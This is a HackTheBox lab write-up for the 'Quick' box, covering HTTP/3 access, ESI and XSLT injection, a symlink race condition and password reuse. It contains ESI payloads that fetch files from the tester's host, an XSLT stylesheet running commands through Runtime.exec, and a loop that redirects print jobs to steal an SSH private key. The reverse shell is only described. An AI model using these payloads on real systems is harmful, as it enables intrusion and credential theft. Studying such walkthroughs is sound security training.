---
layout: post
title: "The Door That Only Spoke a Newer Language"
subtitle: "HTB Quick, where the front door only answers over HTTP/3, a help cache leaks the master key, and a print job races root out of a symlink"
date: 2020-09-05 12:00:00 +0000
description: "Quick hides its front door behind a protocol your tools cannot speak, then loses the keys to an edge cache, a printer race, and a config file that never forgot a password."
image: /assets/og/the-door-that-only-spoke-a-newer-language.png
tags: [hackthebox, writeup]
---

Quick is a box that wins the first round by refusing to be on the right port. You scan it, you find almost nothing, and the one website you do find points at a second site that simply will not load. The link says HTTPS, the obvious port is dead, and your browser and your scanner both shrug and walk away. The trick is that the second site speaks a newer dialect of the web, HTTP/3 over QUIC, riding UDP instead of TCP, and almost no off-the-shelf tool in 2020 knows how to make that call. Once you build a client that can, the box stops being clever and starts being careless. A PDF hands you a login. An edge cache runs a stylesheet you wrote. A printer reads a file it was tricked into pointing at. And a forgotten config file is still holding the password to root, encoded just enough to feel safe and not nearly enough to be.

```
        Q U I C K
        =========
        tcp 443  →  (silence. nobody home.)
        udp 443  →  QUIC  "knock in the new language
                          and the door opens"
                   |
                   v
        pdf leaks a login. the edge cache runs your xslt.
        a print job reads a key it was aimed at.
        a cached config still whispers the root password.
                                            速
```

## 0x01 · the port that wasn't

`nmap -sC -sV` is almost insulting in how little it gives back. Two doors, and one of them is a wall.

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
9001/tcp open  http     Apache httpd 2.4.29 ((Ubuntu))
```

Port 9001 serves Quick, an ISP that sells you internet and a support ticket system. Buried in the page is a link to `https://portal.quick.htb`, and that is where the box trips most people. You browse to it and nothing happens. You scan TCP 443 and it is closed. The site advertises HTTPS, the standard HTTPS port is dead, and the natural conclusion, "broken link, dead end," is exactly the wrong one.

The detail that saves you is in Quick's own marketing copy. It brags about low latency and the latest protocols. Read that as a tell, not a slogan. The newest protocol on the web in 2020 is HTTP/3, and HTTP/3 does not ride TCP. It rides QUIC, which lives on UDP. Your TCP scan was knocking on a door that the building does not have. Think of it like showing up to a house and ringing every doorbell on the front porch, when the only working entrance is around the back and opens to a knock instead of a bell. The door is there. You were just speaking the wrong language at the wrong wall.

## 0x02 · learning the new language

In 2020 nothing common spoke HTTP/3 yet. `curl` could be taught to, but only if you compiled it yourself against a QUIC-capable TLS library. So you build one, following curl's own HTTP/3 notes, and drop the result somewhere out of the way.

```
$ /opt/curl-http3/src/curl --http3 https://portal.quick.htb/
```

Picture HTTP/3 as a regular phone call rerouted onto a brand new network that most phones cannot dial yet. The conversation is the same, the words are the same, but you need a handset built for the new towers. Compiling curl is building that handset. The moment it connects, `portal.quick.htb` loads, and it is a customer portal full of documents.

The one that matters is a PDF.

```
$ /opt/curl-http3/src/curl -s --http3 https://portal.quick.htb/docs/Connectivity.pdf > conn.pdf
$ pdftotext conn.pdf -
   ... Username: elisa@wink.co.uk
   ... Password: Quick4cc3$$
```

A document written for a customer, telling that customer how to log in, sitting on a server reachable by anyone who learned to dial. Those credentials log straight into the ticket system back on port 9001. The hard part of Quick is over, and it was never an exploit. It was a protocol you had to learn how to knock in.

## 0x03 · the cache that ran your homework

Logged into the ticket app as elisa, you open a ticket and watch the responses. The headers are the confession.

```
Via: 1.1 localhost (Apache-HttpClient/4.5.2 (cache))
X-Powered-By: Esigate
```

Esigate is an edge cache. Its job is to assemble pages from fragments using ESI, Edge Side Include, a little markup language where a tag like `<esi:include src="..."/>` tells the cache to go fetch another chunk and paste it in. The problem is the ticket ID. Whatever you type into it gets reflected back through the cache, and the cache parses ESI tags in what it reflects. So if your ticket ID contains an ESI tag, the cache treats your input as its own instructions.

First you prove the cache will reach out and touch something you control.

```
$ curl -b "$JAR" http://quick.htb:9001/ticket.php \
    -d 'title=t&msg=t&id=TKT-001<esi:include src="http://10.10.14.4/iceberg.html"/>'
```

Start a listener, submit the ticket, and the box phones your web server. The cache read your ticket ID and obediently fetched your file. Think of it like a clerk who reads every form out loud, and if your form says "now go next door and read me whatever they hand you," the clerk just does it, because reading the form is the only job they understand.

A fetch is not yet code execution, but Esigate has a sharper edge. ESI includes can pull an XSLT stylesheet, and the XSLT engine here is Xalan, which exposes Java classes, including `java.lang.Runtime`. A stylesheet that calls `Runtime.exec` runs a command on the box.

```
$ cat iceberg.xsl
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:variable name="cmd"><![CDATA[ [ stage two: run a dropped shell script ] ]]></xsl:variable>
    <xsl:variable name="r" select="rt:exec(rt:getRuntime(), $cmd)"/>
  </xsl:template>
</xsl:stylesheet>
```

You aim an ESI include at that stylesheet and the cache runs it. Single commands work, but pipes and redirects choke inside `Runtime.exec`, so you do it in two beats. First stage writes a script to disk with `wget`, second stage executes it.

```
id=...<esi:include src="http://localhost/" stylesheet="http://10.10.14.4/iceberg.xsl"/>
```

Where the dropped script is just [ a bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ]. I am not printing the live shell, and that restraint is the whole point. The dangerous part of this chain is one line, and the safest place for that one line is a bracket in a write-up. Fire the include, and a prompt lands.

```
$ nc -lvnp 443
connect from 10.10.10.186
$ id
uid=1000(sam) gid=1000(sam) groups=1000(sam)
```

You are `sam`, the user the Esigate process runs as.

## 0x04 · the printer that read the wrong page

`sam` is not the only web identity on this box. Apache has a second vhost, `printerv2.quick.htb`, configured with `AssignUserId srvadm srvadm`, so anything it runs, runs as `srvadm`. It is a small app for registering network printers and sending them jobs. The bug is in how it sends a job.

```php
file_put_contents("/var/www/jobs/".$file, $_POST["desc"]);
sleep(0.5);
$printer->text(file_get_contents("/var/www/jobs/".$file));
unlink("/var/www/jobs/".$file);
```

It writes your job to a file, waits half a second, reads it back, prints it, deletes it. The jobs directory is world-writable, and PHP follows symlinks. That half-second sleep is the entire vulnerability. Between the write and the read, the file is just sitting there unguarded, and you are `sam`, who can touch that directory. So you swap the file for a symlink pointing at something only `srvadm` can read.

This is a classic race condition, a TOCTOU, time-of-check to time-of-use. Picture a teacher who collects your essay, sets it on the desk, turns to write the date on the board, then turns back and reads aloud whatever is on the desk. In the second their back is turned, you swap your essay for a sealed letter addressed to the principal. The teacher reads the principal's letter aloud, because the desk is the only thing they ever check, and they checked it before you swapped.

So you loop as `sam`, racing every new job file into a symlink at `srvadm`'s SSH key.

```
$ while true; do
    for f in /var/www/jobs/*; do
      [ -r "$f" ] && rm -f "$f" && ln -s /home/srvadm/.ssh/id_rsa "$f"
    done
  done
```

Then you register a printer that points back at your own machine on port 9100 and catch the job with netcat. The print job the box "prints" is the contents of the file the symlink aimed at.

```
$ nc -lvnp 9100
... -----BEGIN RSA PRIVATE KEY-----
... MIIEpAIBAAKCAQEA...
```

The printer faithfully read a page and sent it to be printed. The page was `srvadm`'s private key. SSH in and you are the next user.

```
$ ssh -i srvadm_key srvadm@10.10.10.186
srvadm@quick:~$ cat user.txt
████████████████████████████████
```

## 0x05 · the config that never forgot

`srvadm` manages printers, and printer software is a packrat. It caches configuration in the user's home, and one cached file remembers too much.

```
srvadm@quick:~$ cat ~/.cache/conf.d/printers.conf
...
DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
```

A device URI with credentials baked right into the URL, percent-encoded. URL-encoding is not encryption. It is just the alphabet the web uses so that special characters survive the trip. Decode it and the secret is plain.

```
srvadm%40quick.htb  →  srvadm@quick.htb
%26ftQ4K3SGde8%3F   →  &ftQ4K3SGde8?
```

Think of it like writing your PIN on a sticky note in pig latin. It looks scrambled for exactly as long as it takes someone to remember the rule, which is no time at all. The password belongs to a printer config, but people reuse passwords across everything they touch, and this one is also the box's root password.

```
srvadm@quick:~$ su -
Password: &ftQ4K3SGde8?
root@quick:~# cat /root/root.txt
████████████████████████████████
```

## 0x06 · the honest caveat

It is tempting to remember Quick as the QUIC box, the gimmick where you compiled curl to win, and to file the rest under filler. That gets the lesson backwards. The HTTP/3 wall was never a security control. It only worked as one by accident, because the tooling of the day could not speak the protocol yet. Obscurity bought the box a few minutes of your confusion and not one ounce of real safety, and the instant your client learned the language the door was just a door. Anything you are protecting by being hard to reach is protected only until someone bothers to reach you, and someone always bothers.

The real failures on Quick are the boring, eternal kind. A secret was written into a document and the document was left where anyone could fetch it. An edge cache trusted user input enough to run it as instructions, which is injection wearing an HTTP-acceleration costume. A program checked a file at one instant and used it at another and never noticed the file changed in between. And a password was stored in a config under a coat of encoding thin enough to see through, then reused on the one account that mattered most. None of those need a new protocol to happen. They happen on TCP, on UDP, on paper. Quick just dressed the oldest mistakes in the newest clothes and dared you to be impressed by the outfit instead of the body underneath.

## 0x07 · outro

```
the door was only hard to find, never hard to open.
a pdf, a cache, a print job, a cached line of text.
four ordinary leaks, one fashionable wall.

the protocol was new. the mistakes were ancient.
obscurity is a costume, not a lock.

learn the language. mind the gap between check and use. wear black.

                                                            EOF
```

---

*HTB: Quick, retired 29 Aug 2020. A hard Linux box that hides plain old leaks and races behind a shiny HTTP/3 front door. The QUIC still answers in a lab and nowhere you don't own.*